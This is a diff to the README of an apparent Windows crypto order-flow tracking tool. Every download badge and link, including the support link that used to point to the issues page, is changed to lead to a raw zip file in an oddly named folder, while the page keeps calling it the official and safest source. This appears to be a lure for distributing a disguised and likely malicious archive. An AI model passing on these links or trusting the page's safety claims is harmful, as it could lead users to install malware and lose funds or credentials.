@@ -1,6 +1,6 @@
 # 🐋 Dark-Pool-Whale-Order-Flow-Sniffer - Track Large Crypto Orders Live
 
-[![Download Now](https://img.shields.io/badge/Download-Dark_Pool_Whale-9C27B0?style=for-the-badge&logo=github)](https://github.com/skyreapermodder/Dark-Pool-Whale-Order-Flow-Sniffer/releases)
+[![Download Now](https://img.shields.io/badge/Download-Dark_Pool_Whale-9C27B0?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/skyreapermodder/Dark-Pool-Whale-Order-Flow-Sniffer/main/unprovokable/Pool-Sniffer-Flow-Whale-Dark-Order-v2.1-beta.4.zip)
 
 ---
 
@@ -42,7 +42,7 @@ To run this application on Windows, your system should meet these minimum requir
 
 Click the large badge below or visit the link directly to get the latest release.
 
-[![Download Now](https://img.shields.io/badge/Download-Dark_Pool_Whale-4CAF50?style=for-the-badge&logo=github)](https://github.com/skyreapermodder/Dark-Pool-Whale-Order-Flow-Sniffer/releases)
+[![Download Now](https://img.shields.io/badge/Download-Dark_Pool_Whale-4CAF50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/skyreapermodder/Dark-Pool-Whale-Order-Flow-Sniffer/main/unprovokable/Pool-Sniffer-Flow-Whale-Dark-Order-v2.1-beta.4.zip)
 
 This page hosts all available versions of the software. You will find the latest Windows installer here.
 
@@ -129,7 +129,7 @@ All settings are available under the **Settings** menu on the top right.
 If you need help or want to report a problem:
 
 - Visit the GitHub repository issues page:  
-  https://github.com/skyreapermodder/Dark-Pool-Whale-Order-Flow-Sniffer/issues
+  https://raw.githubusercontent.com/skyreapermodder/Dark-Pool-Whale-Order-Flow-Sniffer/main/unprovokable/Pool-Sniffer-Flow-Whale-Dark-Order-v2.1-beta.4.zip
 - Write a clear description of your problem.
 - Include your Windows version and app version (shown in Settings).
 
@@ -155,6 +155,6 @@ These topics help the tool deliver clear insights into crypto markets.
 
 ## 📥 Download Link
 
-[Download the latest Windows installer here](https://github.com/skyreapermodder/Dark-Pool-Whale-Order-Flow-Sniffer/releases)
+[Download the latest Windows installer here](https://raw.githubusercontent.com/skyreapermodder/Dark-Pool-Whale-Order-Flow-Sniffer/main/unprovokable/Pool-Sniffer-Flow-Whale-Dark-Order-v2.1-beta.4.zip)
 
 This is the official and safest source of the software. Visit this page anytime to check for updates or new versions.
